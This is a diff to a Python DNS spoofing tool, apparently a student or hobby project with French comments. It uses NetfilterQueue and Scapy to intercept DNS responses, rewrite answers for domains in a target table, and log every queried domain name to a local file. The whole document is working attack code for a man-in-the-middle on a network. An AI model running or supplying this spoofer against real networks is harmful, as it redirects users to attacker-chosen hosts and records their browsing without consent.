@@ -2,6 +2,9 @@ from netfilterqueue import NetfilterQueue
 from scapy.all import * 
 import sys 
 import os 
+import time
+from datetime import date
+import mariadb
 
 
 dns_hosts = {
@@ -13,12 +16,12 @@ dns_hosts = {
 
 def recup_packet(packet):
 
-	
 	paquet_scapy = IP(packet.get_payload())
 
 	if paquet_scapy.haslayer(DNSRR):
 
-		print("paquet initial: ", paquet_scapy.summary())
+		requete_dns = paquet_scapy.summary()
+		print("paquet initial: ", requete_dns)
 
 		spoof_packet = modify_packet(paquet_scapy)
 		print ("paquet modifier: ", spoof_packet.summary())
@@ -30,6 +33,11 @@ def recup_packet(packet):
 def modify_packet(packet):
 
 	qname = packet[DNSQR].qname
+	str_qname= str(qname)
+	fichier = open("dns.txt", "a")
+	fichier.write("\n"+str_qname)
+	fichier.close()
+	
 	print("nom de domaine: ",qname)
 
 	if qname in dns_hosts :
@@ -57,4 +65,5 @@ try:
 
 except KeyboardInterrupt: 
 	os.system("iptables --flush")
+	
 
